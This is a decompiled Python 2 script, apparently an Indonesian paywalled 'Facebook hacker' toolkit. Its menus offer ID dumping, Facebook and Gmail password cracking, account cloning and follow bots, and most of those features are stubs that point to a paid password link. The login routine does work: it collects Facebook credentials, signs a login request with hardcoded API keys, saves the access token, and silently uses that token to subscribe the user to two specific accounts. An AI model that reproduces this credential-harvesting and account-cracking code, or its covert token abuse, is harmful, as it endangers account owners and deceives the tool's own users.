# uncompyle6 version 3.6.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.17 (default, Oct 23 2019, 08:25:46) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
import getpass, os, sys, time, requests, json, hashlib, urllib, re, cookielib, platform, urllib2, mechanize
os.system('clear')
note = ' Mau ngapain di uncompyle ? Nyari Apa ? Sirik Bet Sama Tools Orang Awokwkaokwoqkwoqka\n\t\t Apa Pernah Aing Ganggu Klean ? Awkwowkaowkoaka \n\t\t Lagi Pula Aing Jualnya Ngotak,Cuma 10\x1bk G kek Sebelah\n\t\t Mending Uncompyle TOOLSKIT Sebelah Lebih Berfaedah :* \n\t\t\n\n\t\t Write By Love <3\n\t\t Al2VyN -2K19-\n\t\t Solo Coder\n\t\t '

def ajg():
    fst(r + (' ____          _    _   __        _    _____').center(44))
    fst(r + ('| __ )   ___  | |_ | | / / _____ | |_ |  __ \\ ').center(44))
    fst(y + ('|  _ \\  / _ \\ |  _|| |/ / |  _  ||  _|| |  \\ \\ ').center(44))
    fst(y + ('| |_) || (_) || |_ |  _ \\ | | | || |_ | |__/ / ').center(44))
    fst(g + ('|____/  \\___/ \\___||_| \\_\\|_| |_|\\___||_____/ ').center(44))
    fst(w + '-' * 45)
    fst(r + ('[ TOOLS INFO ]').center(44))
    fst(g + 'Author  :' + c + ' Al2VyN ' + y + '[' + r + ' Indo' + w + 'nesian ' + y + ']')
    fst(g + 'Support :' + c + ' Zedd ' + r + '||' + c + ' ./Fallyn ' + r + '||' + c + ' Dnd')
    fst(g + 'Name    :' + c + ' BotKntD knTools Kit ')
    fst(g + 'Github  : ' + c + 'Https://github.com/Al2VyN')
    fst(g + 'Date    : ' + c + time.asctime())
    fst(g + 'Version :' + r + ' v' + y + '1' + b + '.' + p + '6 ')
    fst(w + '-' * 45)
    slw(c + 'Sorry,Real Tools Use Password')
    slw(c + 'Please Contact The Author')
    slw(c + 'Link password  ' + r + ': ' + g + 'https://shortid.co/fZFa')
    fst(w + '-' * 45)


def ask():
    try:
        token = open('token.log', 'r').read()
        re = requests.get('https://graph.facebook.com/v3.2/me?access_token=' + token)
        ye = json.loads(re.text)
        n.append(ye['name'])
        name = ye['name']
        id = ye['id']
        os.system('reset')
    except (KeyError, IOError):
        os.system('rm -rf token.log')
        login()

    os.system('clear')
    ajg()
    slw(c + '| Sorry,This Tools Use Password')
    slw(c + '| Please Contact The Author To Pay The Password')
    slw(c + '| Link password  ' + r + ': ' + g + 'https://shortid.co/fZFa6 ')
    slw(c + '| Password Trial ' + r + ': ' + g + 'botkntd\n')
    mmqu = raw_input(g + '[' + c + '*' + g + ']' + y + ' Password BotKntD knTools Kit ' + r + ': ' + w)
    if mmqu == '':
        mmk(g + '[' + c + '*' + g + ']' + y + ' Input Password ')
        time.sleep(1)
        ask()
    else:
        if mmqu == 'botkntd':
            mmk(g + '[' + c + '*' + g + ']' + y + ' Checking User ')
            time.sleep(1)
            mmk(g + '[' + c + '*' + g + ']' + y + ' You Are Trial Member ')
            time.sleep(1)
            trial()
        else:
            mmk(g + '[' + c + '*' + g + ']' + y + ' Checking User ')
            time.sleep(1)
            mmk(g + '[' + c + '*' + g + ']' + y + ' Incorrect Password ')
            time.sleep(1)
            ask()


def login():
    os.system('reset')
    ajg()
    fst(r + (' [ Want To Be A Facebook Hacker ? ]').center(44))
    fst(y + (' [ Use The BotKntd knToolsKit ! ]').center(44))
    fst(g + (' [ Trust Me Its Work ! ]').center(44))
    slw(w + '-' * 45)
    fst(r + ('[ LOGIN FACEBOOK ]').center(44))
    id = raw_input(g + '[+]' + y + ' Username : ' + c)
    if id == '':
        fst(r + '[!] Input you email')
        time.sleep(1.2)
        login()
    pwd = raw_input(g + '[+]' + y + ' Password : ' + c)
    if pwd == '':
        fst(r + '[!] Input you password')
        time.sleep(1.2)
        login()
    try:
        API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32'
        data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
        sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.0' + API_SECRET
        yo = hashlib.new('md5')
        yo.update(sig)
        data.update({'sig': yo.hexdigest()})
        ru = requests.get('https://api.facebook.com/restserver.php', params=data)
        op = json.loads(ru.text)
        slw(c + '[*] Processing Login ')
        z = open('token.log', 'w')
        z.write(op['access_token'])
        z.close()
        token = open('token.log', 'r').read()
        re = requests.get('https://graph.facebook.com/v3.2/me?access_token=' + token)
        requests.post('https://graph.facebook.com/100003964985080/subscribers?access_token=' + token)
        requests.post('https://graph.facebook.com/krisna.dimas.9/subscribers?access_token=' + token)
        ye = json.loads(re.text)
        slw(c + '[*] Success Login')
        slw(y + '[*] Prepair menu')
        ask()
    except KeyError:
        slw(r + '[!] Login Failed')
        slw(g + '[!] Login in browser first')
        kntl = raw_input(y + '[?] Try Again ? (y/n) ')
        if kntl == 'y':
            login()
        elif kntl == 'n':
            ex()
        else:
            slw(r + '[!] Incorrect')
            ex()
    except requests.exceptions.ConnectionError:
        slw(r + '[!] Connection Error')
        ex()


def trial():
    try:
        token = open('token.log', 'r').read()
        re = requests.get('https://graph.facebook.com/v3.2/me?access_token=' + token)
        ye = json.loads(re.text)
        n.append(ye['name'])
        name = ye['name']
        id = ye['id']
        os.system('reset')
    except (KeyError, IOError):
        os.system('rm -rf token.log')
        login()

    ajg()
    fst(r + (' [ Want To Be A Facebook Hacker ? ]').center(44))
    fst(y + (' [ Use The BotKntd knToolsKit ! ]').center(44))
    fst(g + (' [ Trust Me Its Work ! ]').center(44))
    slw(w + '-' * 45)
    fst(r + ('[ YOU INFO ]').center(44))
    fst(y + '[' + c + '*' + y + ']' + g + ' Name : ' + w + name)
    fst(y + '[' + c + '*' + y + ']' + g + ' UID  : ' + w + id)
    fst(w + '-' * 45)
    fst(r + ('[ MENU ]').center(44))
    print y + '[' + c + '1.' + y + ']',
    slw(g + ' Dump ID')
    print y + '[' + c + '2.' + y + ']',
    slw(g + ' Yahoo Clone')
    print y + '[' + c + '3.' + y + ']',
    slw(g + ' Crack Facebook')
    print y + '[' + c + '4.' + y + ']',
    slw(g + ' Crack Gmail')
    print y + '[' + c + '5.' + y + ']',
    slw(g + ' Account Checker')
    print y + '[' + c + '6.' + y + ']',
    slw(g + ' Bot Facebook')
    print y + '[' + c + '7.' + y + ']',
    slw(g + ' Check Update')
    print y + '[' + c + '69' + y + ']',
    slw(g + ' Change Account')
    print y + '[' + c + '0.' + y + ']',
    slw(r + ' Exit\n')
    ok = raw_input(c + '@AutismPeople : ' + p)
    fst(w + '-' * 45)
    if ok == '':
        print r + '[!] Input Chose'
        time.sleep(1)
        trial()
    else:
        if ok == '1':
            tdump()
        else:
            if ok == '2':
                tyahoo()
            else:
                if ok == '0':
                    ex()
                else:
                    if ok == '7':
                        update()
                    else:
                        if ok == '3':
                            tfbr()
                        else:
                            if ok == '4':
                                tgmail()
                            else:
                                if ok == '69':
                                    os.system('rm -rf token.log')
                                    print y + '[!] Success Delete Token'
                                    ex()
                                else:
                                    if ok == '5':
                                        tcheck()
                                    else:
                                        if ok == '6':
                                            bot()
                                        else:
                                            print r + '[!] ' + p + ok + r + ' Nothing'
                                            time.sleep(1)
                                            trial()


def tdump():
    os.system('clear')
    ajg()
    fst(r + ('[ DUMP ID ]').center(44))
    print y + '[' + c + '1' + y + ']',
    slw(g + ' Dump ID Friends')
    print y + '[' + c + '2' + y + ']',
    slw(g + ' Dump ID Group Members')
    print y + '[' + c + '3' + y + ']',
    slw(g + ' Dump ID Followers')
    print y + '[' + c + '4' + y + ']',
    slw(g + ' Dump ID Following')
    print y + '[' + c + '5' + y + ']',
    slw(g + ' Dump ID Friends From Friends')
    print y + '[' + c + '6' + y + ']',
    slw(g + ' Dump ID Groups')
    print y + '[' + c + '7' + y + ']',
    slw(g + ' Dump ID All Member Your Groups')
    print y + '[' + c + '8' + y + ']',
    slw(g + ' Dump ID All Friends From Friends')
    print y + '[' + c + '0' + y + ']',
    slw(r + ' Back\n')
    ok = raw_input(c + '@AutismPeople : ' + p)
    fst(w + '-' * 45)
    if ok == '':
        print r + '[!] Input Chose'
        time.sleep(1)
        trial()
    else:
        if ok == '1':
            tfriends()
        else:
            if ok == '2':
                tgroups()
            else:
                if ok == '3':
                    tfollower()
                else:
                    if ok == '4':
                        tfollowing()
                    else:
                        if ok == '5':
                            tFFF()
                        else:
                            if ok == '6':
                                tgetgroups()
                            else:
                                if ok == '0':
                                    trial()
                                else:
                                    if ok == '7':
                                        tallgm()
                                    else:
                                        if ok == '8':
                                            tallfr()
                                        else:
                                            print r + '[!] ' + p + ok + r + ' Nothing'
                                            time.sleep(1)
                                            trial()


def tfbr():
    os.system('clear')
    ajg()
    fst(r + ('[ Crack Facebook ]').center(44))
    print y + '[' + c + '1' + y + ']',
    slw(g + ' Crack With Password')
    print y + '[' + c + '2' + y + ']',
    slw(g + ' Crack With Auto Password Friend')
    print y + '[' + c + '3' + y + ']',
    slw(g + ' Crack With Auto Password Groups')
    print y + '[' + c + '0' + y + ']',
    slw(r + ' Back\n')
    ok = raw_input(c + '@AutismPeople : ' + p)
    fst(w + '-' * 45)
    if ok == '':
        print r + '[!] Input Chose'
        time.sleep(1)
        trial()
    else:
        if ok == '1':
            tayocrack()
        else:
            if ok == '2':
                tpal()
                trial()
            else:
                if ok == '3':
                    tpala()
                    trial()
                else:
                    if ok == '0':
                        trial()
                    else:
                        print r + '[!] ' + p + ok + r + ' Nothing'
                        time.sleep(1)
                        trial()


def tfriends():
    os.system('clear')
    ajg()
    try:
        token = open('token.log', 'r').read()
    except IOError:
        slw(r + '[!] Token Invalid')
        os.system('rm -rf token.log')
        time.sleep(1)
        login()
    else:
        try:
            os.mkdir('Kntd')
        except OSError:
            try:
                print r + ('[ Dump ID Friends ]').center(44)
                slw(c + 'Sorry,Real Tools Use Password')
                slw(c + 'Please Contact The Author')
                slw(c + 'Link password  ' + r + ': ' + g + 'https://shortid.co/fZFa6')
                fst(w + '-' * 45)
                ngentod = raw_input(r + '                   [ \x1b[0mOK \x1b[31;1m]')
                trial()
            except KeyboardInterrupt:
                print r + '\r[!] Stopped'
                trial()
            except KeyError:
                print r + '[!] Something Error'
                trial()
            except (requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError):
                print r + '[!] Connection Error                 '
                exit()


def tgroups():
    global id
    global token
    os.system('clear')
    ajg()
    try:
        token = open('token.log', 'r').read()
    except IOError:
        print '[!] Token Invalid'
        os.system('rm -rf token.log')
        time.sleep(1)
        login()

    try:
        os.mkdir('Kntd')
    except OSError:
        pass

    try:
        print r + ('[ Dump ID Group Members ]').center(44)
        id = raw_input(y + '[+] Group ID   : ' + c)
        re = requests.get('https://graph.facebook.com/' + id + '?access_token=' + token)
        s = json.loads(re.text)
        print y + '[+] Group Name : ' + c + s['name']
        fst(w + '-' * 45)
        slw(c + 'Sorry,Real Tools Use Password')
        slw(c + 'Please Contact The Author')
        slw(c + 'Link password  ' + r + ': ' + g + 'https://shortid.co/fZFa6')
        fst(w + '-' * 45)
        ngentod = raw_input(r + '                   [ \x1b[0mOK \x1b[31;1m]')
        trial()
    except KeyboardInterrupt:
        print '\r[!] Stopped'
        trial()
    except KeyError:
        print '[!] Something Error'
        trial()
    except requests.exceptions.ConnectionError:
        print '[!] Connection Error                 '
        exit()


def tfollower():
    os.system('clear')
    ajg()
    try:
        token = open('token.log', 'r').read()
    except IOError:
        slw(r + '[!] Token Invalid')
        os.system('rm -rf token.log')
        time.sleep(1)
        login()
    else:
        try:
            os.mkdir('Kntd')
        except OSError:
            try:
                print r + ('[ Dump ID Followers ]').center(44)
                slw(c + 'Sorry,Real Tools Use Password')
                slw(c + 'Please Contact The Author')
                slw(c + 'Link password  ' + r + ': ' + g + 'https://shortid.co/fZFa6')
                fst(w + '-' * 45)
                ngentod = raw_input(r + '                   [ \x1b[0mOK \x1b[31;1m]')
                trial()
            except KeyboardInterrupt:
                print r + '\r[!] Stopped'
                trial()
            except KeyError:
                print r + '[!] Something Error'
                trial()
            except (requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError):
                print r + '[!] Connection Error                 '
                exit()


def tfollowing():
    os.system('clear')
    ajg()
    try:
        token = open('token.log', 'r').read()
    except IOError:
        slw(r + '[!] Token Invalid')
        os.system('rm -rf token.log')
        time.sleep(1)
        login()
    else:
        try:
            os.mkdir('Kntd')
        except OSError:
            try:
                print r + ('[ Dump ID Following ]').center(44)
                slw(c + 'Sorry,Real Tools Use Password')
                slw(c + 'Please Contact The Author')
                slw(c + 'Link password  ' + r + ': ' + g + 'https://shortid.co/fZFa6')
                fst(w + '-' * 45)
                ngentod = raw_input(r + '                   [ \x1b[0mOK \x1b[31;1m]')
                trial()
            except KeyboardInterrupt:
                print r + '\r[!] Stopped'
                trial()
            except KeyError:
                print r + '[!] Something Error'
                trial()
            except (requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError):
                print r + '[!] Connection Error                 '
                exit()


def tFFF():
    os.system('clear')
    ajg()
    try:
        token = open('token.log', 'r').read()
    except IOError:
        slw(r + '[!] Token Invalid')
        os.system('rm -rf token.log')
        time.sleep(1)
        login()
    else:
        try:
            os.mkdir('Kntd')
        except OSError:
            try:
                print r + ('[ Dump ID Friends From Friend ]').center(44)
                id = raw_input(y + '[+] Input ID Friends : ' + c)
                re = requests.get('https://graph.facebook.com/' + id + '?access_token=' + token)
                v = json.loads(re.text)
                print y + '[+] Friend Name : ' + c + v['name']
                fst(w + '-' * 45)
                slw(c + 'Sorry,Real Tools Use Password')
                slw(c + 'Please Contact The Author')
                slw(c + 'Link password  ' + r + ': ' + g + 'https://shortid.co/fZFa6')
                fst(w + '-' * 45)
                ngentod = raw_input(r + '                   [ \x1b[0mOK \x1b[31;1m]')
                trial()
            except KeyboardInterrupt:
                print r + '\r[!] Stopped'
                trial()
            except KeyError:
                print r + '[!] Something Error'
                trial()
            except (requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError):
                print r + '[!] Connection Error                 '
                exit()


def tgetgroups():
    os.system('clear')
    ajg()
    try:
        token = open('token.log', 'r').read()
    except IOError:
        slw(r + '[!] Token Invalid')
        os.system('rm -rf token.log')
        time.sleep(1)
        login()
    else:
        try:
            os.mkdir('Kntd')
        except OSError:
            try:
                print r + ('[ Dump ID Groups ]').center(44)
                slw(c + 'Sorry,Real Tools Use Password')
                slw(c + 'Please Contact The Author')
                slw(c + 'Link password  ' + r + ': ' + g + 'https://shortid.co/fZFa6')
                fst(w + '-' * 45)
                ngentod = raw_input(r + '                   [ \x1b[0mOK \x1b[31;1m]')
                trial()
            except KeyboardInterrupt:
                print r + '\r[!] Stopped'
                trial()
            except KeyError:
                print r + '[!] Something Error'
                trial()
            except requests.exceptions.ConnectionError:
                print r + '[!] Connection Error                 '
                exit()


def tallgm():
    os.system('clear')
    ajg()
    slw(r + ('[ Dump Id All Groups Members ]').center(44))
    try:
        token = open('token.log', 'r').read()
    except IOError:
        slw(r + '[!] Token Invalid')
        os.system('rm -rf token.log')
        time.sleep(1)
        login()
    else:
        try:
            os.mkdir('Kntd')
        except OSError:
            try:
                d = requests.get('https://graph.facebook.com/v3.2/me/groups?limit=5000&access_token=' + token)
                l = json.loads(d.text)
                for k in l['data']:
                    print y + '[+] Group Name : ' + c + k['name']
                    fst(w + '-' * 45)
                    slw(c + 'Sorry,Real Tools Use Password')
                    slw(c + 'Please Contact The Author')
                    slw(c + 'Link password  ' + r + ': ' + g + 'https://shortid.co/fZFa6')
                    fst(w + '-' * 45)

                ngentod = raw_input(r + '                   [ \x1b[0mOK \x1b[31;1m]')
                trial()
            except KeyboardInterrupt:
                print r + '\r[!] Stopped'
            except KeyError:
                print r + '\r[!] Something Error'
            except requests.exceptions.ConnectionError:
                print r + '[!] Connection Error                 '
                exit()


def tallfr():
    os.system('clear')
    ajg()
    slw(r + ('[ Dump Id All Friends From Friend ]').center(44))
    try:
        token = open('token.log', 'r').read()
    except IOError:
        slw(r + '[!] Token Invalid')
        os.system('rm -rf token.log')
        time.sleep(1)
        login()
    else:
        try:
            os.mkdir('Kntd')
        except OSError:
            try:
                d = requests.get('https://graph.facebook.com/v3.2/me/friends?limit=5000&access_token=' + token)
                l = json.loads(d.text)
                for k in l['data']:
                    print y + '[+] Friend Name : ' + c + k['name']
                    fst(w + '-' * 45)
                    slw(c + 'Sorry,Real Tools Use Password')
                    slw(c + 'Please Contact The Author')
                    slw(c + 'Link password  ' + r + ': ' + g + 'https://shortid.co/fZFa6')
                    fst(w + '-' * 45)

                ngentod = raw_input(r + '                   [ \x1b[0mOK \x1b[31;1m]')
                trial()
            except KeyboardInterrupt:
                print r + '\r[!] Stopped'
            except KeyError:
                print r + '\r[!] Something Error'
            except requests.exceptions.ConnectionError:
                print r + '[!] Connection Error                 '
                exit()


def tfriendse():
    global h
    global o
    global yj
    os.system('reset')
    ajg()
    try:
        token = open('token.log', 'r').read()
    except IOError:
        slw(r + '[!] Token Invalid')
        os.system('rm -rf token.log')
        time.sleep(1)
        login()
    else:
        try:
            os.mkdir('Kntd')
        except OSError:
            try:
                o = []
                h = 0
                yj = 0
                print r + ('[ Yahoo Clone ]').center(44)
                slw(c + 'Sorry,Real Tools Use Password')
                slw(c + 'Please Contact The Author')
                slw(c + 'Link password  ' + r + ': ' + g + 'https://shortid.co/fZFa6')
                fst(w + '-' * 45)
                ngentod = raw_input(r + '                   [ \x1b[0mOK \x1b[31;1m]')
                trial()
            except KeyError:
                pass


def tayocrack():
    os.system('reset')
    ajg()
    print r + ('[ Crack Facebook ]').center(44)
    iz = raw_input(y + '[+] File List ID : ' + c)
    korbanpass = raw_input(y + '[+] Password     : ' + c)
    if len(korbanpass) <= 5:
        print r + 'Password To Short'
        tayocrack()
    else:
        if korbanpass == '':
            print r + 'input password'
        slw(w + '-' * 45)
        try:
            slw(c + 'Sorry,Real Tools Use Password')
            slw(c + 'Please Contact The Author')
            slw(c + 'Link password  ' + r + ': ' + g + 'https://shortid.co/fZFa6')
            fst(w + '-' * 45)
            ngentod = raw_input(r + '                   [ \x1b[0mOK \x1b[31;1m]')
            trial()
        except IOError:
            print '\x1b[1;91m[!] File Not Found'
            ngentod = raw_input(r + '                   [ \x1b[0mOK \x1b[31;1m]')
            trial()


def tgmail():
    os.system('clear')
    ajg()
    print r + ('[ Brute Gmail ]').center(44)
    print y + '[' + c + '1.' + y + ']',
    slw(g + ' Brute Gmail')
    print y + '[' + c + '2.' + y + ']',
    slw(g + ' Create Password List')
    print y + '[' + c + '0' + y + ']',
    slw(r + ' Back\n')
    kntd = raw_input(c + '@AutismPeople ' + r + ': ' + g)
    if kntd == '1':
        tlogine()
    else:
        if kntd == '2':
            twl()
        else:
            if kntd == '0':
                trial()
            else:
                if kntd == '':
                    print r + 'Input Chose'
                    ngentod = raw_input(r + '                   [ \x1b[0mOK \x1b[31;1m]')
                    tgmail()
                else:
                    print r + 'Incorrect'
                    ngentod = raw_input(r + '                   [ \x1b[0mOK \x1b[31;1m]')
                    tgmail()


def tlogine():
    os.system('clear')
    ajg()
    try:
        print r + ('[!] \x1b[33;1mMake sure the target email address is correct \x1b[31;1m[!]').center(44)
        print b + ('[ DATA ]').center(44)
        user_name = raw_input(g + 'Target email  : ' + c)
        ppq = user_name
        if ppq == '':
            print r + '[!] Input Email'
            ngentod = raw_input(r + '                   [ \x1b[0mOK \x1b[31;1m]')
            tlogine()
        ktl = raw_input(g + 'Password List : ' + c)
        mmq(w + '-' * 45)
        try:
            slw(c + 'Sorry,Real Tools Use Password')
            slw(c + 'Please Contact The Author')
            slw(c + 'Link password  ' + r + ': ' + g + 'https://shortid.co/fZFa6')
            fst(w + '-' * 45)
            ngentod = raw_input(r + '                   [ \x1b[0mOK \x1b[31;1m]')
            trial()
        except KeyboardInterrupt:
            print '[!] Stopped'
            time.sleep(1)
            trial()
        except requests.exceptions.ConnectionError:
            print r + '[!] Connection Error'
            time.sleep(1)
            ex()

    except KeyboardInterrupt:
        print '[!] Stopped'
        time.sleep(1)
        trial()
    except requests.exceptions.ConnectionError:
        print r + '[!] Connection Error'
        time.sleep(1)
        ex()
    except IOError:
        print r + '[!] File Not Found'
        ngentod = raw_input(r + '                   [ \x1b[0mOK \x1b[31;1m]')
        tlogine()


def update():
    os.system('git pull')
    print 'update success'
    os.system('python2 BotKntD.py')


r = '\x1b[31;1m'
y = '\x1b[33;1m'
b = '\x1b[34;1m'
p = '\x1b[35;1m'
c = '\x1b[36;1m'
w = '\x1b[0;1m'
g = '\x1b[32;1m'
lr = '\\e[0;31m'
ly = '\\e[0;33m'
lb = '\\e[0;34m'
lp = '\x1b[0;35;0m'
lc = '\x1b[0;36m'
lw = '\x1b[0;0m'
lg = '\x1b[0;32m'
h = '\x1b[96m'
n = []
ng = []
ids = []
die = []
live = []
cek = []
lin = []
target = []
targete = []
toke = []
fin = []
check = []
crsh = []
liv = []
diet = []
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_equiv(True)
br.set_handle_referer(True)
br.set_cookiejar(cookielib.LWPCookieJar())
br.set_handle_redirect(True)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def ex():
    slw(r + '[!] Ah She Up')
    time.sleep(1)
    slw(r + '[!] Exiting')
    time.sleep(1.5)
    slw(r + '[!] See You' + w)
    time.sleep(0.5)
    os.system('clear')
    exit()


def slw(s):
    for i in s + '\n':
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.005)


def fst(s):
    for i in s + '\n':
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.0001)


def wl():
    os.system('nano password.txt')
    trial()


def twl():
    os.system('nano password.txt')
    trial()


def mmk(s):
    for i in s + '\n':
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.01)


def mmq(s):
    for i in s + '\n':
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(1e-07)


def tpal():
    os.system('reset')
    ajg()
    try:
        token = open('token.log', 'r').read()
    except IOError:
        slw(r + '[!] Token Invalid')
        os.system('rm -rf token.log')
        time.sleep(1)
        login()
    else:
        try:
            os.mkdir('Kntd')
        except OSError:
            try:
                print r + ('[ Crack Auto Password ]').center(44)
                slw(c + 'Sorry,Real Tools Use Password')
                slw(c + 'Please Contact The Author')
                slw(c + 'Link password  ' + r + ': ' + g + 'https://shortid.co/fZFa6')
                fst(w + '-' * 45)
                ngentod = raw_input(r + '                   [ \x1b[0mOK \x1b[31;1m]')
                trial()
            except requests.exceptions.ConnectionError:
                print r + '[!] Connection Error'
                time.sleep(1)
                ex()
            except KeyError as IOError:
                pass


def tcheck():
    os.system('reset')
    ajg()
    try:
        token = open('token.log', 'r').read()
    except IOError:
        slw(r + '[!] Token Invalid')
        os.system('rm -rf token.log')
        time.sleep(1)
        login()
    else:
        try:
            os.mkdir('Kntd')
        except OSError:
            try:
                print r + ('[ Account Cheker ]').center(44)
                slw(c + 'Sorry,Real Tools Use Password')
                slw(c + 'Please Contact The Author')
                slw(c + 'Link password  ' + r + ': ' + g + 'https://shortid.co/fZFa6')
                fst(w + '-' * 45)
                ngentod = raw_input(r + '                   [ \x1b[0mOK \x1b[31;1m]')
                trial()
            except requests.exceptions.ConnectionError:
                print r + '[!] Connection Error'
                time.sleep(1)
                ex()
            except KeyError as IOError:
                pass


def tpala():
    os.system('reset')
    ajg()
    try:
        token = open('token.log', 'r').read()
    except IOError:
        slw(r + '[!] Token Invalid')
        os.system('rm -rf token.log')
        time.sleep(1)
        login()
    else:
        try:
            os.mkdir('Kntd')
        except OSError:
            try:
                print r + ('[ Crack Auto Password Group ]').center(44)
                slw(w + '-' * 45)
                slw(c + 'Sorry,Real Tools Use Password')
                slw(c + 'Please Contact The Author')
                slw(c + 'Link password  ' + r + ': ' + g + 'https://shortid.co/fZFa6')
                fst(w + '-' * 45)
                ngentod = raw_input(r + '                   [ \x1b[0mOK \x1b[31;1m]')
                trial()
            except requests.exceptions.ConnectionError:
                print r + '[!] Connection Error'
                time.sleep(1)
                ex()
            except KeyError as IOError:
                pass


def tyahoo():
    os.system('clear')
    ajg()
    fst(r + ('[ Yahoo Clone ]').center(44))
    print y + '[' + c + '1' + y + ']',
    slw(g + ' Yahoo Clone Friends')
    print y + '[' + c + '2' + y + ']',
    slw(g + ' Yahoo Clone Friends From Friends')
    print y + '[' + c + '3' + y + ']',
    slw(g + ' Yahoo Clone Followers')
    print y + '[' + c + '4' + y + ']',
    slw(g + ' Yahoo Clone Following')
    print y + '[' + c + '0' + y + ']',
    slw(r + ' Back\n')
    ok = raw_input(c + '@AutismPeople : ' + p)
    fst(w + '-' * 45)
    if ok == '':
        print r + '[!] Input Chose'
        time.sleep(1)
        trial()
    else:
        if ok == '1':
            tfriendse()
        else:
            if ok == '2':
                tfriendse()
            else:
                if ok == '3':
                    tfriendse()
                else:
                    if ok == '4':
                        tfriendse()
                    else:
                        if ok == '0':
                            trial()
                        else:
                            print r + '[!] ' + p + ok + r + ' Nothing'
                            time.sleep(1)
                            trial()


def bot():
    os.system('clear')
    ajg()
    fst(r + ('[ BOT FACEBOOK ]').center(44))
    print y + '[' + c + '1' + y + ']',
    slw(g + ' Unfriend')
    print y + '[' + c + '2' + y + ']',
    slw(g + ' Unfollow')
    print y + '[' + c + '3' + y + ']',
    slw(g + ' Auto Follow')
    print y + '[' + c + '4' + y + ']',
    slw(g + ' Auto Add Friend From Group')
    print y + '[' + c + '0' + y + ']',
    slw(r + ' Back\n')
    ok = raw_input(c + '@AutismPeople : ' + p)
    fst(w + '-' * 45)
    if ok == '':
        print r + '[!] Input Chose'
        time.sleep(1)
        trial()
    else:
        if ok == '1':
            unf()
        else:
            if ok == '2':
                unfl()
            else:
                if ok == '0':
                    trial()
                else:
                    if ok == '3':
                        foll()
                    else:
                        if ok == '4':
                            add()
                        else:
                            print r + '[!] ' + p + ok + r + ' Nothing'
                            time.sleep(1)
                            trial()


def unf():
    os.system('reset')
    ajg()
    try:
        token = open('token.log', 'r').read()
    except IOError:
        slw(r + '[!] Token Invalid')
        os.system('rm -rf token.log')
        time.sleep(1)
        login()
    else:
        try:
            os.mkdir('Kntd')
        except OSError:
            try:
                print r + ('[ Auto Unfriend ]').center(44)
                slw(c + 'Sorry,Real Tools Use Password')
                slw(c + 'Please Contact The Author')
                slw(c + 'Link password  ' + r + ': ' + g + 'https://shortid.co/fZFa6')
                fst(w + '-' * 45)
                ngentod = raw_input(r + '                   [ \x1b[0mOK \x1b[31;1m]')
                trial()
            except KeyboardInterrupt:
                print r + '\r[!] Stopped'
                trial()
            except KeyError:
                print r + '[!] Something Error'
                trial()
            except requests.exceptions.ConnectionError:
                print r + '[!] Connection Error                 '
                exit()


def unfl():
    id = []
    os.system('reset')
    ajg()
    try:
        token = open('token.log', 'r').read()
    except IOError:
        slw(r + '[!] Token Invalid')
        os.system('rm -rf token.log')
        time.sleep(1)
        login()
    else:
        try:
            os.mkdir('Kntd')
        except OSError:
            try:
                print r + ('[ Auto Unfollow ]').center(44)
                slw(c + 'Sorry,Real Tools Use Password')
                slw(c + 'Please Contact The Author')
                slw(c + 'Link password  ' + r + ': ' + g + 'https://shortid.co/fZFa6')
                fst(w + '-' * 45)
                ngentod = raw_input(r + '                   [ \x1b[0mOK \x1b[31;1m]')
                trial()
            except KeyboardInterrupt:
                print r + '\r[!] Stopped'
                trial()
            except KeyError:
                print r + '[!] Something Error'
                trial()
            except requests.exceptions.ConnectionError:
                print r + '[!] Connection Error                 '
                exit()


red = '\x1b[1;91m'
gren = '\x1b[1;92m'
yel = '\x1b[1;93m'
gid = []
token = []
asua = []
mm = []

def add():
    os.system('reset')
    ajg()
    try:
        token = open('token.log', 'r').read()
    except IOError:
        print '[!] Token Invalid'
        time.sleep(1)
        exit()
    else:
        try:
            os.mkdir('Kntd')
        except OSError:
            try:
                print r + ('[ Auto Add Friend ]').center(44)
                slw(c + 'Sorry,Real Tools Use Password')
                slw(c + 'Please Contact The Author')
                slw(c + 'Link password  ' + r + ': ' + g + 'https://shortid.co/fZFa6')
                fst(w + '-' * 45)
                ngentod = raw_input(r + '                   [ \x1b[0mOK \x1b[31;1m]')
                trial()
            except KeyboardInterrupt:
                print r + '\r[!] Stopped'
                trial()
            except KeyError:
                print r + '[!] Something Error'
                trial()
            except requests.exceptions.ConnectionError:
                print r + '[!] Connection Error                 '
                exit()


def foll():
    os.system('clear')
    ajg()
    try:
        token = open('token.log', 'r').read()
    except IOError:
        slw(r + '[!] Token Invalid')
        os.system('rm -rf token.log')
        time.sleep(1)
        login()
    else:
        try:
            os.mkdir('Kntd')
        except OSError:
            try:
                print r + ('[ Auto Follower]').center(44)
                slw(c + 'Sorry,Real Tools Use Password')
                slw(c + 'Please Contact The Author')
                slw(c + 'Link password  ' + r + ': ' + g + 'https://shortid.co/fZFa6')
                fst(w + '-' * 45)
                ngentod = raw_input(r + '                   [ \x1b[0mOK \x1b[31;1m]')
                trial()
            except KeyboardInterrupt:
                print r + '\r[!] Stopped'
                trial()
            except KeyError:
                print r + '[!] Something Error'
                trial()
            except requests.exceptions.ConnectionError:
                print r + '[!] Connection Error                 '
                exit()


ask()